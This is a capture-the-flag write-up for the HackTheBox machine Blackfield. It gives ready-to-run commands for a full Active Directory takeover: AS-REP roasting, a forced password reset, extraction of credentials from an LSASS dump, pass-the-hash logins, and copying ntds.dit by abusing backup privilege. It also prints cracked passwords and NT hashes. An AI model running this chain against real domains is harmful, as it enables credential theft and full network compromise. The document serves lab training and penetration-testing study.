---
title: "Blackfield"
date: 2026-08-04 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, hard, smb, kerberos, as-rep-roast, bloodhound, forcehchangepassword, lsass, pass-the-hash, sebackupprivilege, ntds, secretsdump, active-directory]
description: "Anonymous SMB access exposes 315 Active Directory usernames; one account lacks Kerberos pre-authentication, its cracked AS-REP hash yields credentials that reveal a ForceChangePassword ACE on a second account, whose share access surfaces an LSASS dump containing the NT hash for svc_backup — the account that lands WinRM as the user foothold."
---
## Overview

Blackfield is a hard-difficulty Windows Domain Controller. The attack chain begins with anonymous SMB enumeration of a `profiles$` share that leaks 315 AD usernames, one of which is AS-REP-roastable (`support`); cracking the hash recovers `support`'s password. BloodHound exposes a `ForceChangePassword` ACE from `support` to `audit2020`; rpcclient resets that password, unlocking a `forensic` SMB share containing a live LSASS dump. pypykatz extracts `svc_backup`'s NT hash from the dump and evil-winrm delivers a Pass-the-Hash shell. From there, `SeBackupPrivilege` via Backup Operators membership enables diskshadow VSS + robocopy to steal `ntds.dit`, and secretsdump cracks every domain hash including Administrator's.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 254.5,116.0 150.0,150.0 137.1,167.8 108.2,136.4" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Heavy real-world AD enumeration dominates — anonymous SMB, AS-REP roasting, BloodHound ACL analysis, and SeBackupPrivilege abuse are all techniques seen in live Active Directory environments; no CVE and no custom exploit code.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS | Domain: blackfield.local |
| 88/tcp | Kerberos | DC01 |
| 135/tcp | RPC | |
| 389/tcp | LDAP | blackfield.local |
| 445/tcp | SMB | anonymous access to profiles$ |
| 593/tcp | RPC over HTTP | |
| 3268/tcp | Global Catalog | |
| 5985/tcp | WinRM | HTTP — evil-winrm target |

```bash
nmap -p- --min-rate=1000 -T4 -Pn 10.10.10.X
nmap -p53,88,135,389,445,593,3268,5985 -sC -sV -Pn 10.10.10.X
```

The standout findings are anonymous SMB with a readable `profiles$` share and an open WinRM port — both common in poorly hardened AD environments and both central to the attack chain.

## Enumeration

Anonymous SMB enumeration reveals two shares of interest: `profiles$` (READ) and `forensic` (NO ACCESS initially).

```bash
smbmap -H 10.10.10.X -u null
```

Listing `profiles$` without credentials returns 315 user home directories — each directory name is a valid AD username.

```bash
smbclient -N //10.10.10.X/profiles$ -c "ls" | awk '{print $1}' | grep -v '^\.' | grep -v '^$' | grep -v 'blocks' > users.txt
```

With a 315-entry username list, AS-REP Roasting identifies which accounts have [Kerberos pre-authentication disabled](https://cwe.mitre.org/data/definitions/287.html) — a misconfiguration that allows offline cracking of the KDC reply without authentication.

```bash
GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.X | grep krb5asrep > support.hash
```

`support` returns an AS-REP hash. Cracking it against rockyou recovers the password in seconds.

```bash
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt --force
```

Credential recovered: `support:#00^BlackKnight`.

With valid credentials, BloodHound maps the AD attack surface and immediately highlights a critical ACE: `support` holds `ForceChangePassword` over `audit2020`, a case of [improper privilege management (CWE-269)](https://cwe.mitre.org/data/definitions/269.html) from over-permissive ACL delegation.

```bash
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.X -c All --zip
```

## Foothold

rpcclient's `setuserinfo2` changes `audit2020`'s password via RPC without supplying the original — this is the `ForceChangePassword` right exercised over the wire.

```bash
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.X -c 'setuserinfo2 audit2020 23 "Hack3dBlackfield!"'
```

```bash
netexec smb 10.10.10.X -u audit2020 -p 'Hack3dBlackfield!'
```

`audit2020` now has READ access to the `forensic` share. The `memory_analysis` subdirectory contains `lsass.zip` — a live LSASS memory dump, an operational security failure that represents [insufficiently protected credentials (CWE-522)](https://cwe.mitre.org/data/definitions/522.html) stored on a network share.

```bash
smbclient -U 'audit2020%Hack3dBlackfield!' //10.10.10.X/forensic -c "cd memory_analysis; get lsass.zip"
```

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

pypykatz extracts `svc_backup`'s NT hash: `9658d1d1dcd9250115e2205d9f48400d`. WinRM accepts the hash directly via [Pass-the-Hash](https://cwe.mitre.org/data/definitions/294.html).

```bash
netexec winrm 10.10.10.X -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
evil-winrm -i 10.10.10.X -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

Shell lands as `svc_backup`.

## User flag

```bash
type C:\Users\svc_backup\Desktop\user.txt   # HTB{...}
```

Shell obtained as `svc_backup` and the user flag is ours.

## Privilege Escalation

`svc_backup` is a member of the Backup Operators built-in group, which grants `SeBackupPrivilege` and `SeRestorePrivilege` — privileges that intentionally bypass DACL enforcement, making this [incorrect permission assignment (CWE-732)](https://cwe.mitre.org/data/definitions/732.html) equivalent to Domain Admin when exploited correctly.

The attack requires two capabilities: a VSS snapshot to bypass the NTDS exclusive file lock, and backup privilege to read the unlocked copy. diskshadow provides the snapshot; robocopy's `/B` flag invokes the backup APIs.

Create the diskshadow script on target via WinRM:

```bash
netexec winrm 10.10.10.X -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -X 'Set-Content -Path "C:\programdata\vss.dsh" -Value "set context persistent nowriters`r`nset metadata c:\programdata\meta.cab`r`nset verbose on`r`nadd volume c: alias df`r`ncreate`r`nexpose %df% z:"'
```

Run diskshadow to expose a VSS shadow of C: as Z:

```bash
netexec winrm 10.10.10.X -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -x "diskshadow /s c:\programdata\vss.dsh"
```

Copy `ntds.dit` from the shadow using backup privilege (bypasses the NTDS service lock):

```bash
netexec winrm 10.10.10.X -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -x "robocopy /B z:\windows\ntds c:\programdata\ ntds.dit"
```

Save the SYSTEM hive (boot key needed to decrypt ntds.dit):

```bash
netexec winrm 10.10.10.X -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -x "reg save HKLM\SYSTEM c:\programdata\system.hive"
```

Exfiltrate both files:

```bash
evil-winrm -i 10.10.10.X -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd C:\programdata
*Evil-WinRM* PS C:\programdata> download ntds.dit
*Evil-WinRM* PS C:\programdata> download system.hive
```

Dump all domain hashes offline:

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

Administrator NT hash recovered: `184fb5e5178480be64824d4cd53b99ee`.

```bash
netexec winrm 10.10.10.X -u administrator -H 184fb5e5178480be64824d4cd53b99ee -X "type C:\Users\Administrator\Desktop\root.txt"
```

## Root flag

```bash
type C:\Users\Administrator\Desktop\root.txt   # HTB{...}
```

Full domain compromise achieved — the Administrator NT hash extracted from `ntds.dit` via `SeBackupPrivilege` completes the chain.
